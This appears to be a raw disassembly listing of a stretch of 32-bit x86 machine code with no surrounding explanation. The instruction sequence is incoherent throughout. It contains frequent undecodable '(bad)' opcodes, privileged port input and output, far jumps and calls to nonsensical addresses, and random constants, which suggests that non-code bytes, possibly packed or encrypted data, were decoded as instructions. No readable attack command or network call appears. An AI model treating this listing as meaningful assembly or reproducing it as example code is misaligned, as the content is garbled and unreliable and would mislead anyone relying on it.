  41425a:	mov    bh,0x19
  41425c:	xor    DWORD PTR [ebp-0x4a1d26e3],esi
  414262:	mov    esp,0xe4395a9e
  414267:	inc    ebp
  414268:	mov    eax,0x9dce9cdb
  41426d:	inc    edx
  41426e:	mov    eax,0x18064382
  414273:	shr    BYTE PTR [eax],cl
  414275:	lods   al,BYTE PTR ds:[esi]
  414276:	pop    esi
  414277:	inc    esi
  414278:	jbe    0x414278
  41427a:	dec    ebp
  41427b:	sub    DWORD PTR [edx-0x4e],0xfc7f7540
  414282:	pop    esp
  414283:	jo     0x414231
  414285:	iret   
  414286:	dec    ebp
  414287:	adc    eax,0x46a674f0
  41428c:	std    
  41428d:	ror    BYTE PTR [ebx+0x554a5f94],cl
  414293:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414294:	std    
  414295:	xor    bh,bl
  414297:	mov    al,ds:0xbbc2af2d
  41429c:	es ss clc 
  41429f:	cwde   
  4142a0:	scas   eax,DWORD PTR es:[edi]
  4142a1:	popa   
  4142a2:	sahf   
  4142a3:	jl     0x414237
  4142a5:	cmp    eax,0x2de6b3f9
  4142aa:	dec    edi
  4142ab:	sub    ah,BYTE PTR [ecx+0x4349f1e6]
  4142b1:	in     eax,dx
  4142b2:	int    0xa0
  4142b4:	out    0x45,al
  4142b6:	test   BYTE PTR [esi+edi*2],cl
  4142b9:	out    0x5b,eax
  4142bb:	test   eax,0xf73e6f9c
  4142c0:	jp     0x41427f
  4142c2:	jbe    0x41425f
  4142c4:	sbb    bh,bl
  4142c6:	retf   
  4142c7:	leave  
  4142c8:	fwait
  4142c9:	out    dx,al
  4142ca:	call   0x624e1fe7
  4142cf:	retf   
  4142d0:	push   ebp
  4142d1:	ins    BYTE PTR es:[edi],dx
  4142d2:	ret    
  4142d3:	lock lock retf 0xda29
  4142d8:	lds    edi,FWORD PTR [ebx]
  4142da:	shr    esp,0x56
  4142dd:	out    0x7,al
  4142df:	ss xchg edi,eax
  4142e1:	test   al,0x50
  4142e3:	scas   eax,DWORD PTR es:[edi]
  4142e4:	rcl    BYTE PTR [edx+0x55],1
  4142e7:	cdq    
  4142e8:	dec    edx
  4142e9:	inc    edi
  4142ea:	fidiv  WORD PTR [ecx+0x3ac5cca4]
  4142f0:	pop    sp
  4142f2:	add    cl,BYTE PTR [ecx]
  4142f4:	(bad)  
  4142f5:	mov    ch,0xd8
  4142f7:	rcr    dh,cl
  4142f9:	je     0x41435f
  4142fb:	xchg   edi,eax
  4142fc:	pop    ebx
  4142fd:	pop    ebp
  4142fe:	shr    BYTE PTR [ecx+eiz*2],cl
  414301:	data16 fldz 
  414304:	dec    esi
  414305:	das    
  414306:	xchg   ebp,eax
  414307:	dec    ecx
  414308:	lahf   
  414309:	sbb    eax,0x12785f1e
  41430e:	mov    esp,0x442e726a
  414313:	shr    DWORD PTR [eax-0x243c73d2],1
  414319:	into   
  41431a:	adc    al,0x2d
  41431c:	out    dx,eax
  41431d:	cld    
  41431e:	ret    0xd7d5
  414321:	and    BYTE PTR [edi-0x65],bh
  414324:	rcl    eax,1
  414326:	jle    0x414327
  414328:	pop    edi
  414329:	std    
  41432a:	push   edi
  41432b:	sbb    al,BYTE PTR [edx+eiz*4]
  41432e:	mov    dl,0x14
  414330:	sbb    al,BYTE PTR [eax]
  414332:	js     0x4142f7
  414334:	add    eax,0xab99703a
  414339:	or     BYTE PTR [ebp+0x55],dl
  41433c:	repz call 0xbf0e:0x7479a91a
  414344:	sbb    eax,0xbdb2f4a7
  414349:	adc    BYTE PTR [ecx+0x530b21c0],cl
  41434f:	cdq    
  414350:	jbe    0x4142d3
  414352:	call   0x19b43ab4
  414357:	mov    ds:0xa29d5cea,al
  41435c:	pop    esi
  41435d:	push   edi
  41435e:	cwde   
  41435f:	and    al,0x12
  414361:	dec    eax
  414362:	and    BYTE PTR [ebp+ebp*8+0x62],cl
  414366:	push   edi
  414367:	inc    edx
  414368:	xor    eax,0x7493d6d
  41436d:	leave  
  41436e:	push   0xffffffbf
  414370:	xor    al,0x30
  414372:	fcomi  st,st(1)
  414374:	adc    DWORD PTR [edx-0x274fcc5],esi
  41437a:	(bad)  
  41437c:	mov    BYTE PTR [ebp+0x4b232c2a],cl
  414382:	jno    0x4143bd
  414384:	fcmovb st,st(3)
  414386:	inc    ebp
  414387:	adc    eax,0x5337d109
  41438c:	shr    DWORD PTR [eax-0x2be34d19],0x4b
  414393:	das    
  414394:	sbb    eax,0x9fd26855
  414399:	lea    ebx,[ebp+0x666cfe9f]
  41439f:	dec    ebx
  4143a0:	pavgw  mm5,QWORD PTR [eax]
  4143a3:	pop    edx
  4143a4:	ins    BYTE PTR es:[edi],dx
  4143a5:	inc    ebp
  4143a6:	pop    edx
  4143a7:	add    eax,0x994a2167
  4143ac:	push   ebx
  4143ad:	inc    esp
  4143ae:	sbb    DWORD PTR ds:0x9a08a79f,eax
  4143b4:	lock cmp DWORD PTR [ecx+0x4c],eax
  4143b8:	lods   al,BYTE PTR ds:[esi]
  4143b9:	retf   0x9290
  4143bc:	rol    BYTE PTR [ebx-0x2b5823cd],cl
  4143c2:	stos   BYTE PTR es:[edi],al
  4143c3:	mov    ecx,0x40d3bace
  4143c8:	mov    DWORD PTR [ebp-0x4d6b9b6],ecx
  4143ce:	adc    BYTE PTR [eax-0x26],0xd0
  4143d2:	mov    esp,0xea52e00
  4143d7:	bnd call 0xdb986b49
  4143dd:	inc    ebx
  4143de:	les    edx,FWORD PTR [eax+edx*4+0x42]
  4143e2:	and    DWORD PTR [esi],ebx
  4143e4:	or     eax,DWORD PTR [ebp-0x80]
  4143e7:	sub    al,0x6f
  4143e9:	shl    DWORD PTR [esp+0x3e150ef9],cl
  4143f0:	pop    edi
  4143f1:	ror    DWORD PTR [edi+edi*4],0x60
  4143f5:	ret    
  4143f6:	aaa    
  4143f7:	xchg   esi,eax
  4143f8:	cmp    DWORD PTR [edi-0x7d9ad4d6],edx
  4143fe:	mov    esp,0x98425e0a
  414403:	(bad)  
  414404:	(bad)  
  414405:	xchg   esp,eax
  414406:	and    ebx,DWORD PTR [ecx]
  414408:	inc    eax
  414409:	mov    ebp,DWORD PTR [edi+0x4d]
  41440c:	mov    ds:0xf27c8fd4,al
  414411:	in     al,0x98
  414413:	push   0x33
  414415:	mov    edi,0x971ab058
  41441a:	xlat   BYTE PTR ds:[ebx]
  41441b:	ret    
  41441c:	fist   WORD PTR [edx+edx*2-0x3e]
  414420:	mov    ah,0xdd
  414422:	test   edi,ebx
  414424:	out    0xd,eax
  414426:	icebp  
  414427:	(bad)  
  414428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414429:	jns    0x4143b2
  41442b:	bound  ebx,QWORD PTR cs:[edx+0x6f720dae]
  414432:	shl    esp,0xc4
  414435:	adc    eax,0xf95a9d7e
  41443a:	and    BYTE PTR [ecx-0x431bb13e],ah
  414440:	and    dh,BYTE PTR [edi+0x7d]
  414443:	xchg   edi,eax
  414444:	push   0x4a
  414446:	jle    0x41441e
  414448:	jns    0x41443a
  41444a:	xor    bl,BYTE PTR ds:0xbb44a87c
  414450:	jmp    0x264b104e
  414455:	push   edx
  414456:	pop    ebp
  414457:	fisubr DWORD PTR [eax]
  414459:	les    esi,FWORD PTR [eax]
  41445b:	mov    dh,0xe3
  41445d:	sbb    eax,0x609cf2a0
  414462:	scas   eax,DWORD PTR es:[edi]
  414463:	fidivr WORD PTR [esi+0x1890953b]
  414469:	es or  al,0x6a
  41446c:	leave  
  41446d:	stos   DWORD PTR es:[edi],eax
  41446e:	jge    0x414460
  414470:	mov    DWORD PTR [ebp+0x70889bea],ebp
  414476:	push   cs
  414477:	stos   DWORD PTR es:[edi],eax
  414478:	icebp  
  414479:	cmp    edi,ebp
  41447b:	xchg   esi,eax
  41447c:	addr16 daa 
  41447e:	push   ds
  41447f:	test   DWORD PTR [esp+edx*8],esp
  414482:	xor    eax,0x3c7b3d10
  414487:	out    dx,al
  414488:	fnstsw WORD PTR [esi+0x3606f5a7]
  41448e:	xor    DWORD PTR [esp+esi*2+0x3c64e2f3],ebp
  414495:	inc    ebx
  414496:	lar    edi,WORD PTR [edx-0x22]
  41449a:	add    al,0x4c
  41449c:	aas    
  41449d:	inc    ebx
  41449e:	iret   
  41449f:	data16 jmp 0x4144d7
  4144a2:	fbld   TBYTE PTR [ebx-0x45431639]
  4144a8:	pop    esi
  4144a9:	popf   
  4144aa:	out    0xc8,al
  4144ac:	in     eax,0x9e
  4144ae:	dec    eax
  4144af:	sbb    bh,BYTE PTR [eax]
  4144b1:	mov    ecx,0x1b2f6652
  4144b6:	(bad)  
  4144b7:	mov    edi,0xf2930c0b
  4144bc:	xor    eax,0x7b513739
  4144c1:	or     bl,bh
  4144c3:	sbb    bh,bl
  4144c5:	and    BYTE PTR [esi],ah
  4144c7:	xchg   BYTE PTR [esi],ch
  4144c9:	adc    al,0x81
  4144cb:	inc    ecx
  4144cc:	jno    0x414467
  4144ce:	hlt    
  4144cf:	mov    ah,0x18
  4144d1:	test   eax,0xedfe0e07
  4144d6:	outs   dx,BYTE PTR ds:[esi]
  4144d7:	mov    eax,ds:0xe7b45dcb
  4144dc:	ins    BYTE PTR es:[edi],dx
  4144dd:	nop
  4144de:	retf   
  4144df:	cdq    
  4144e0:	mov    ch,0x63
  4144e2:	or     eax,0x346be0eb
  4144e7:	or     edx,DWORD PTR [eax]
  4144e9:	mov    WORD PTR [eax-0x194b1325],cs
  4144ef:	pop    ebp
  4144f0:	and    DWORD PTR [ebx+0x18],eax
  4144f3:	outs   dx,BYTE PTR ds:[esi]
  4144f4:	inc    ebx
  4144f5:	sahf   
  4144f6:	or     ecx,DWORD PTR [edx+0x2693a061]
  4144fc:	in     al,dx
  4144fd:	in     eax,dx
  4144fe:	sbb    BYTE PTR [ebx+eax*4],bl
  414501:	push   eax
  414502:	mov    eax,0x4a55c040
  414507:	pushf  
  414508:	jle    0x41451a
  41450a:	sbb    al,0x13
  41450c:	pop    edx
  41450d:	outs   dx,DWORD PTR ds:[esi]
  41450e:	mov    ds:0x3c088de9,eax
  414513:	loop   0x41458d
  414515:	bound  edi,QWORD PTR [edx-0x3a30246]
  41451b:	jecxz  0x41458c
  41451d:	loope  0x414544
  41451f:	xchg   ecx,eax
  414520:	mov    BYTE PTR [edx+0x4746f634],ah
  414526:	xor    al,0x72
  414528:	loop   0x414514
  41452a:	into   
  41452b:	and    BYTE PTR [edi-0x24b3ed9f],dl
  414531:	shl    BYTE PTR [edi-0x49341e],cl
  414537:	jmp    0xcea1:0x56b62f39
  41453e:	das    
  41453f:	inc    ecx
  414540:	sbb    edi,DWORD PTR [ecx+ebx*8]
  414543:	xchg   ecx,ebx
  414545:	aaa    
  414546:	mov    ?,WORD PTR [edi]
  414548:	xor    bl,BYTE PTR [ecx]
  41454a:	xchg   ebp,eax
  41454b:	cdq    
  41454c:	loopne 0x414587
  41454e:	jmp    0xaa54:0xbcadfadd
  414555:	mov    bl,0xb2
  414557:	push   eax
  414558:	in     al,0x68
  41455a:	mov    BYTE PTR [esi+0x58],cl
  41455d:	rcl    DWORD PTR ds:0xbeef6491,cl
  414563:	aam    0xad
  414565:	push   eax
  414566:	cmp    esi,ebp
  414568:	int    0x0
  41456a:	inc    DWORD PTR [ecx+0x64]
  41456d:	dec    edi
  41456e:	mov    ch,dh
  414570:	imul   esi,DWORD PTR [esi+0xf],0x6
  414574:	lods   eax,DWORD PTR ds:[esi]
  414575:	mov    bl,0xe3
  414577:	add    al,BYTE PTR [ecx-0x757dc1a9]
  41457d:	push   0x6a
  41457f:	mov    al,ds:0x95315482
  414584:	les    ebx,FWORD PTR [ebx-0x112ce71]
  41458a:	jo     0x41450e
  41458c:	sub    al,0x6a
  41458e:	dec    eax
  41458f:	cmp    DWORD PTR [esi],edi
  414591:	adc    eax,0xccf9184
  414596:	pop    ebx
  414597:	sub    eax,0x4171ca76
  41459c:	idiv   DWORD PTR [ebx]
  41459e:	repz adc BYTE PTR [esi-0x65],0xa1
  4145a3:	dec    ecx
  4145a4:	dec    ebp
  4145a5:	sahf   
  4145a6:	(bad)  
  4145a7:	sbb    cl,BYTE PTR [edi]
  4145a9:	scas   al,BYTE PTR es:[edi]
  4145aa:	popf   
  4145ab:	test   al,0x3f
  4145ad:	repnz pop esp
  4145af:	in     al,dx
  4145b0:	retf   
  4145b1:	out    0x55,al
  4145b3:	les    ecx,FWORD PTR [eax+ebx*1]
  4145b6:	iret   
  4145b7:	cmovp  esp,DWORD PTR [ebp-0x6f]
  4145bb:	sub    edi,DWORD PTR [edi]
  4145bd:	xchg   edx,eax
  4145be:	sbb    ebp,DWORD PTR [edi]
  4145c0:	js     0x41462e
  4145c2:	mov    ebx,0xe4ce4cf6
  4145c7:	das    
  4145c8:	inc    ebx
  4145c9:	adc    al,BYTE PTR [edi-0x77]
  4145cc:	jo     0x414624
  4145ce:	dec    esi
  4145cf:	adc    al,0xa7
  4145d1:	mov    bl,0x9c
  4145d3:	cwde   
  4145d4:	fcom   QWORD PTR [edi]
  4145d6:	jmp    0x58ee:0x36b2ca6e
  4145dd:	ja     0x4145bd
  4145df:	stos   DWORD PTR es:[edi],eax
  4145e0:	(bad)  
  4145e1:	cwde   
  4145e2:	mov    bh,0x9c
  4145e4:	pop    ebp
  4145e5:	jmp    0x41461c
  4145e7:	cmp    DWORD PTR [edx],ecx
  4145e9:	shl    BYTE PTR [ebx+0x36206bb9],0xeb
  4145f0:	mov    BYTE PTR [edx-0x14],cl
  4145f3:	ret    
  4145f4:	std    
  4145f5:	(bad)  
  4145f6:	shr    BYTE PTR [esi],1
  4145f8:	cld    
  4145f9:	xchg   DWORD PTR [edx+0x19],ebx
  4145fc:	push   ds
  4145fd:	jae    0x414658
  4145ff:	pop    esp
  414600:	push   esi
  414601:	mov    al,ds:0x94486863
  414606:	mov    DWORD PTR [ebp-0x57976556],0xe08eff06
  414610:	mov    cl,0x1a
  414612:	sbb    esp,esp
  414614:	mov    al,ds:0xcf200c8c
  414619:	inc    edx
  41461a:	gs in  al,dx
  41461c:	sub    eax,0x7f84a305
  414621:	push   es
  414622:	mov    bh,0x21
  414624:	xor    DWORD PTR [eax-0x1fd65715],ecx
  41462a:	aas    
  41462b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41462c:	mov    al,BYTE PTR [ebp+0x3a970c90]
  414632:	fld    QWORD PTR [eax-0x743759e7]
  414638:	retf   0x1749
  41463b:	or     ah,BYTE PTR [edi+ebp*8+0x42]
  41463f:	and    al,0xeb
  414641:	je     0x414632
  414643:	cmp    al,BYTE PTR [esi-0x7d]
  414646:	adc    BYTE PTR [esi-0x8],0xd2
  41464a:	adc    BYTE PTR ds:0x3c0fe89e,cl
  414650:	scas   eax,DWORD PTR es:[edi]
  414651:	js     0x414606
  414653:	sub    bh,BYTE PTR [eax-0x3fe5f246]
  414659:	adc    al,0xce
  41465b:	mul    dh
  41465d:	mov    dl,0xcd
  41465f:	jmp    0x6c144d9
  414664:	cwde   
  414665:	outs   dx,BYTE PTR ds:[esi]
  414666:	in     al,0x83
  414668:	dec    esp
  414669:	ret    
  41466a:	pop    ss
  41466b:	stos   BYTE PTR es:[edi],al
  41466c:	cmp    dl,BYTE PTR [esi-0x1d182b44]
  414672:	test   BYTE PTR [esi],dh
  414674:	fs aam 0xdc
  414677:	fwait
  414678:	clc    
  414679:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41467a:	fadd   QWORD PTR [edx+0x1b]
  41467d:	jle    0x414684
  41467f:	or     DWORD PTR [ebx-0x72],edi
  414682:	mov    bl,0x3d
  414684:	cdq    
  414685:	dec    edx
  414686:	sub    BYTE PTR [edi+0x571be0a5],bl
  41468c:	sub    BYTE PTR [eax-0x3f5182eb],al
  414692:	mov    ecx,0x15458e3c
  414697:	mov    cl,0x7f
  414699:	fcmovbe st,st(3)
  41469b:	fidiv  WORD PTR [ebp+0x11]
  41469e:	in     al,0x56
  4146a0:	scas   al,BYTE PTR es:[edi]
  4146a1:	inc    ecx
  4146a2:	xchg   esi,eax
  4146a3:	cmp    ebp,0xffffffcb
  4146a6:	cmp    eax,0x6bffa6d6
  4146ab:	std    
  4146ac:	adc    DWORD PTR [ecx-0xf34965c],ecx
  4146b2:	repz loopne 0x414681
  4146b5:	add    DWORD PTR [edi+ebx*8+0x40],edx
  4146b9:	fstp   DWORD PTR [edi+ebx*8]
  4146bc:	jns    0x414710
  4146be:	dec    bh
  4146c0:	jbe    0x414658
  4146c2:	sbb    dl,BYTE PTR [eax]
  4146c4:	ret    
  4146c5:	cdq    
  4146c6:	dec    esp
  4146c7:	iret   
  4146c8:	retf   
  4146c9:	fidiv  DWORD PTR [ebx+0x51]
  4146cc:	push   edx
  4146cd:	js     0x4146a9
  4146cf:	mov    ah,0xa5
  4146d1:	push   eax
  4146d2:	and    bh,cl
  4146d4:	cmc    
  4146d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146d6:	add    dh,ah
  4146d8:	(bad)  
  4146d9:	inc    edx
  4146da:	sbb    eax,0xcab9d68b
  4146df:	es out 0x6c,al
  4146e2:	hlt    
  4146e3:	aas    
  4146e4:	(bad)  
  4146e5:	pop    ebx
  4146e6:	mov    dl,0xde
  4146e8:	dec    ecx
  4146e9:	call   0x45ac:0x55380f73
  4146f0:	out    dx,eax
  4146f1:	jle    0x414696
  4146f3:	jge    0x4146ec
  4146f5:	sahf   
  4146f6:	pop    esp
  4146f7:	sub    dl,bh
  4146f9:	faddp  st(1),st
  4146fb:	mov    ds:0x7319a20e,eax
  414700:	push   ecx
  414701:	daa    
  414702:	mov    bh,0x69
  414704:	mul    eax
  414706:	xchg   ebx,eax
  414707:	ja     0x4146a7
  414709:	stos   BYTE PTR es:[edi],al
  41470a:	int    0x94
  41470c:	aad    0xc
  41470e:	xchg   edx,eax
  41470f:	ins    BYTE PTR es:[edi],dx
  414710:	das    
  414711:	ds mov dl,0x6d
  414714:	inc    edx
  414715:	or     edx,DWORD PTR [esp+edi*1]
  414718:	add    DWORD PTR [ebx+0x4e],0x55c47501
  41471f:	aad    0xcc
  414721:	in     eax,0x96
  414723:	pop    ebp
  414724:	sbb    BYTE PTR [ebp-0x132159ed],0x1f
  41472b:	shl    BYTE PTR [edx-0x53],1
  41472e:	pop    es
  41472f:	push   0x93f2dcf2
  414734:	gs (bad) 
  414736:	mov    ds:0x5ee7dac5,al
  41473b:	cdq    
  41473c:	stos   BYTE PTR es:[edi],al
  41473d:	jb     0x4147ae
  41473f:	rcl    BYTE PTR ds:[ebp-0x51],cl
  414743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414744:	neg    DWORD PTR [edx]
  414746:	fidivr WORD PTR [ebx+0x7d14b70]
  41474c:	stc    
  41474d:	xchg   ecx,eax
  41474e:	mov    DWORD PTR [edi+0x62bb227f],ecx
  414754:	out    dx,eax
  414755:	stc    
  414756:	push   edx
  414757:	das    
  414758:	add    ebp,ecx
  41475a:	icebp  
  41475b:	xchg   ebx,eax
  41475c:	sbb    dl,ch
  41475e:	cli    
  41475f:	jae    0x4147dd
  414761:	dec    esi
  414762:	loop   0x414743
  414764:	and    ebp,DWORD PTR [ecx]
  414766:	test   DWORD PTR [esi+0x6],ebx
  414769:	js     0x41476e
  41476b:	out    0xaf,al
  41476d:	das    
  41476e:	test   DWORD PTR [edi+0x26],eax
  414771:	sahf   
  414772:	idiv   BYTE PTR [ebx+0x6e]
  414775:	xchg   ecx,eax
  414776:	sub    bl,BYTE PTR [ecx+0x77946929]
  41477c:	enter  0x1428,0xfb
  414780:	aad    0x94
  414782:	push   ebp
  414783:	sub    esp,DWORD PTR [esi+0x30]
  414786:	push   0x73d5f144
  41478b:	add    eax,0xc2fc356b
  414790:	cdq    
  414791:	xchg   esp,eax
  414792:	lahf   
  414793:	or     DWORD PTR [ebx],edi
  414795:	icebp  
  414796:	push   ebp
  414797:	jge    0x414769
  414799:	icebp  
  41479a:	inc    esi
  41479b:	mov    ds:0x86b9b1cf,al
  4147a0:	add    eax,0x3a33c871
  4147a5:	cmp    DWORD PTR [ebx+ecx*4],ebx
  4147a8:	jae    0x414764
  4147aa:	xor    ah,0x8c
  4147ad:	(bad)  [eax+0x4dfdd567]
  4147b3:	mov    bl,0xc4
  4147b5:	in     al,0x7a
  4147b7:	xchg   edx,eax
  4147b8:	dec    esi
  4147b9:	mov    al,0xc0
  4147bb:	jbe    0x4147c9
  4147bd:	sub    ch,cl
  4147bf:	push   es
  4147c0:	dec    edx
  4147c1:	push   es
  4147c2:	loope  0x4147d5
  4147c4:	or     DWORD PTR [ecx+0x35],esp
  4147c7:	mov    eax,ds:0xe9721cf4
  4147cc:	pop    esp
  4147cd:	ins    DWORD PTR es:[edi],dx
  4147ce:	fwait
  4147cf:	sbb    ah,ah
  4147d1:	hlt    
  4147d2:	nop
  4147d3:	fsubr  st(7),st
  4147d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147d6:	dec    ecx
  4147d7:	shl    eax,0xdb
  4147da:	add    DWORD PTR ds:[esi],ebp
  4147dd:	stos   BYTE PTR es:[edi],al
  4147de:	fwait
  4147df:	pop    ebp
  4147e0:	mov    WORD PTR [esi],si
  4147e3:	jp     0x414782
  4147e5:	push   0xd2854b92
  4147ea:	or     DWORD PTR [ecx],0x5d4645a8
  4147f0:	out    dx,al
  4147f1:	adc    al,0xfc
  4147f3:	xor    BYTE PTR [edi],ch
  4147f5:	push   ds
  4147f6:	in     al,0x49
  4147f8:	sub    DWORD PTR [edi+0x7526d5a9],0xed06cfff
  414802:	(bad)  
  414804:	adc    DWORD PTR [ecx],edx
  414806:	adc    edx,DWORD PTR [ebx]
  414808:	xlat   BYTE PTR ds:[ebx]
  414809:	cmp    eax,0x1318116a
  41480e:	add    bh,al
  414810:	lds    ecx,FWORD PTR [eax]
  414812:	std    
  414813:	js     0x414894
  414815:	imul   ecx
  414817:	mov    ebp,DWORD PTR [ebx]
  414819:	lahf   
  41481a:	loopne 0x414883
  41481c:	pop    ss
  41481d:	jp     0x4147e8
  41481f:	push   es
  414820:	rcl    DWORD PTR [edi-0x11baaa70],1
  414826:	cmp    eax,0xeb4edf2b
  41482b:	fadd   QWORD PTR [ebx*8-0x12ce9e8e]
  414832:	mov    esi,0xbc08ca0
  414837:	and    ch,0x65
  41483a:	push   eax
  41483b:	sbb    dh,BYTE PTR [esi]
  41483d:	jle    0x414810
  41483f:	mov    ebp,0xe8339ce4
  414844:	int    0x99
  414846:	ins    BYTE PTR es:[edi],dx
  414847:	jmp    0x4147cb
  414849:	stos   BYTE PTR es:[edi],al
  41484a:	popa   
  41484b:	jmp    0x4147f8
  41484d:	loopne 0x414815
  41484f:	fsubr  DWORD PTR [edx+0x59595432]
  414855:	mov    ah,BYTE PTR [edi-0x1b552274]
  41485b:	mov    al,al
  41485d:	fisubr DWORD PTR [edx-0x75db94ba]
  414863:	dec    eax
  414864:	out    0xc,eax
  414866:	fwait
  414867:	sbb    esi,eax
  414869:	fnsave [esp+eax*2]
  41486c:	addr16 xchg ebx,eax
  41486e:	xor    bh,BYTE PTR [ecx-0x6c]
  414871:	sub    eax,0x54e67b7b
  414876:	add    edx,eax
  414878:	inc    ebp
  414879:	lods   al,BYTE PTR ds:[esi]
  41487a:	out    0x71,eax
  41487c:	sub    dl,cl
  41487e:	add    eax,0xa3d865fb
  414883:	mov    edx,0x80038192
  414888:	inc    ecx
  414889:	or     cl,BYTE PTR [ebp+0x7f]
  41488c:	outs   dx,DWORD PTR ds:[esi]
  41488d:	mov    ?,WORD PTR [edx-0x78104cc]
  414893:	adc    DWORD PTR [esi+0x5d],0x13
  414897:	cmp    BYTE PTR [esi],al
  414899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41489a:	push   ds
  41489b:	in     al,0x39
  41489d:	out    dx,eax
  41489e:	jecxz  0x4148a4
  4148a0:	loope  0x41490c
  4148a2:	or     BYTE PTR [ebx],ah
  4148a4:	les    edx,FWORD PTR [edi+0x58]
  4148a7:	push   edi
  4148a8:	mov    DWORD PTR [eax+0xbc29a84],esi
  4148ae:	test   BYTE PTR [edx+0x51e2a302],0xaa
  4148b5:	out    dx,al
  4148b6:	sub    al,0xd8
  4148b8:	mov    ebp,0x2279a685
  4148bd:	xor    ah,0x70
  4148c0:	call   0x99d25e9f
  4148c5:	cmp    al,0x1b
  4148c7:	sub    DWORD PTR [eax+0x5efb187],ebp
  4148cd:	fsub   st(1),st
  4148cf:	xchg   esi,eax
  4148d0:	ss mov ch,0x9e
  4148d3:	adc    BYTE PTR [ecx-0x52],al
  4148d6:	fidivr WORD PTR [ebx+ebp*4-0x3f]
  4148da:	js     0x41488b
  4148dc:	outs   dx,BYTE PTR ds:[esi]
  4148dd:	loope  0x4148fc
  4148df:	dec    edx
  4148e0:	push   0x74
  4148e2:	mov    al,ds:0x31801043
  4148e7:	shl    DWORD PTR [esi],cl
  4148e9:	mov    eax,ds:0xec0d8e68
  4148ee:	jb     0x4148b2
  4148f0:	inc    ebp
  4148f1:	fdivr  QWORD PTR [ebp+0x7fb47c0]
  4148f7:	stc    
  4148f8:	imul   DWORD PTR [edx]
  4148fa:	fisub  WORD PTR [ebp+0x76]
  4148fd:	ja     0x4148c5
  4148ff:	in     al,0xed
  414901:	js     0x4148c0
  414903:	sbb    DWORD PTR [ebx],edi
  414905:	pop    esp
  414906:	out    dx,al
  414907:	arpl   WORD PTR ds:0xe69c4623,ax
  41490d:	cs pusha 
  41490f:	idiv   DWORD PTR [edx]
  414911:	add    al,0x69
  414913:	or     al,0xbd
  414915:	xor    ebx,DWORD PTR [esi+0x27]
  414918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414919:	(bad)  
  41491a:	fcmovbe st,st(1)
  41491c:	dec    edi
  41491d:	out    dx,al
  41491e:	push   es
  41491f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414920:	lods   eax,DWORD PTR ds:[esi]
  414921:	or     DWORD PTR es:[ecx-0x4],esi
  414925:	adc    al,0xe0
  414927:	push   ss
  414928:	xor    dl,dl
  41492a:	add    eax,0xdbebe4c3
  41492f:	sbb    BYTE PTR [ebx-0x1abf1356],cl
  414935:	lods   eax,DWORD PTR fs:[esi]
  414937:	sbb    al,0x22
  414939:	adc    BYTE PTR [edx-0x419f6cb1],0x19
  414940:	daa    
  414941:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414943:	hlt    
  414944:	or     bh,BYTE PTR [esi-0x4c]
  414947:	addr16 mov al,0xac
  41494a:	call   0x8dbb:0xd3bc51e5
  414951:	adc    dh,BYTE PTR [ecx+esi*2+0x788bdc5e]
  414958:	and    ch,bh
  41495a:	fldenv [edx]
  41495c:	xchg   ecx,eax
  41495d:	inc    esi
  41495e:	jmp    0x4148e6
  414960:	jge    0x414931
  414962:	push   ebp
  414963:	xchg   esp,eax
  414964:	cld    
  414965:	sbb    bh,BYTE PTR [eax-0x19]
  414968:	in     al,dx
  414969:	mov    eax,0xc65bc93e
  41496e:	call   0x43fe9fc3
  414973:	or     edx,DWORD PTR [edi]
  414975:	pushf  
  414976:	add    edx,0xd532e566
  41497c:	in     eax,dx
  41497d:	shl    DWORD PTR [edi],0x14
  414980:	shl    BYTE PTR [edx*2+0x3e000a4b],cl
  414987:	leave  
  414988:	in     eax,0xbf
  41498a:	adc    al,0x24
  41498c:	xchg   DWORD PTR [edi+0xd],ebx
  41498f:	ins    DWORD PTR es:[edi],dx
  414990:	adc    ebp,DWORD PTR ds:0x307ef382
  414996:	retf   
  414997:	mov    ebp,0x56365926
  41499c:	data16 cli 
  41499e:	mov    al,dl
  4149a0:	hlt    
  4149a1:	cmp    DWORD PTR [edx],edi
  4149a3:	and    dl,BYTE PTR [ecx+0x3128a4d0]
  4149a9:	sahf   
  4149aa:	mov    cl,0x30
  4149ac:	inc    ebp
  4149ad:	jmp    0xf7f4:0xbe00c761
  4149b4:	fiadd  WORD PTR [ebp-0x54]
  4149b7:	xchg   edx,eax
  4149b8:	stos   DWORD PTR es:[edi],eax
  4149b9:	scas   eax,DWORD PTR es:[edi]
  4149ba:	and    esi,esi
  4149bc:	imul   ebx,DWORD PTR [ebx+ebp*2],0xde171d4a
  4149c3:	ss ffree st(7)
  4149c6:	inc    DWORD PTR [esi]
  4149c8:	jmp    0x3520a00a
  4149cd:	repnz test BYTE PTR [edx],0xa1
  4149d1:	je     0x4149a5
  4149d3:	fwait
  4149d4:	in     eax,dx
  4149d5:	ss icebp 
  4149d7:	aaa    
  4149d8:	out    dx,al
  4149d9:	jbe    0x4149e7
  4149db:	in     al,dx
  4149dc:	psubsb mm5,QWORD PTR [edx-0x2330559f]
  4149e3:	(bad)  
  4149e4:	sub    BYTE PTR [ebx],al
  4149e6:	mov    al,ds:0x22a584ef
  4149eb:	adc    al,0x6
  4149ed:	push   ss
  4149ee:	mov    dh,0x9
  4149f0:	mov    ebp,0x5d0b9306
  4149f5:	or     BYTE PTR [edi-0x6],0x5e
  4149f9:	dec    ebx
  4149fa:	or     al,0x2
  4149fc:	arpl   WORD PTR ds:0x122da50b,dx
  414a02:	xlat   BYTE PTR ds:[ebx]
  414a03:	jmp    0x414a07
  414a05:	fldcw  WORD PTR [eax+edx*2+0x6f]
  414a09:	not    ah
  414a0b:	lods   al,BYTE PTR ds:[esi]
  414a0c:	loope  0x4149d7
  414a0e:	add    eax,DWORD PTR [eax+0x36f247ce]
  414a14:	push   eax
  414a15:	mov    edx,0xc1965d3a
  414a1a:	mov    WORD PTR [ecx],cs
  414a1c:	arpl   WORD PTR [edx],bp
  414a1e:	adc    DWORD PTR [eax-0x2d],0xffffffaf
  414a22:	das    
  414a23:	lahf   
